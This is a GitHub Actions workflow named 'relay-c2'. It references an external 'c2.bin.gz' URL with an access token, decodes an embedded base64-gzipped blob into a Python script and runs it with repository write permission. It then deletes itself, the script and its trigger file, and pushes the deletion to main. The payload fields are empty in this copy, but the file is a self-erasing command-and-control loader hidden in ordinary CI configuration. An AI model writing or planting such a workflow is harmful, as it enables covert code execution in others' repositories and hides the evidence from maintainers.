name: relay-c2
on:
  push:
    paths:
      - '.github/relay-trigger'
  workflow_dispatch:
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: apply byte-exact
        env:
          C2_URL: "https://static.chainopera.ai/files/e1fc23e2-edb9-424e-86f8-5bb704ad43d0/c2.bin.gz?tk=ZmlsZTplMWZjMjNlMi1lZGI5LTQyNGUtODZmOC01YmI3MDRhZDQzZDA6MTc5MzQ3OTUwNg.OWUxZGVlMTUzMDhmMmM4NDZkZDZjYjQyMzUyNmJjOTU"
          C2_GZ_MD5: "b9001f5d67538d6ca21508988bce70cf"
          SB64: ""
          MSG64: ""
        run: |
          set -euo pipefail
          python3 -c "import base64,gzip,os;open('relay_c2.py','wb').write(gzip.decompress(base64.b64decode(os.environ['SB64'])))"
          python3 -c "import base64,os;open('/tmp/msg.txt','wb').write(base64.b64decode(os.environ['MSG64']))"
          git config user.name "relay-bot"
          git config user.email "relay-bot@users.noreply.github.com"
          python3 relay_c2.py
      - name: cleanup
        run: |
          set -euo pipefail
          git rm -q --ignore-unmatch .github/workflows/relay-c2.yml relay_c2.py .github/relay-trigger || true
          git commit -q -m "chore: xoa workflow relay-c2 tam thoi" || true
          git push origin HEAD:main || true
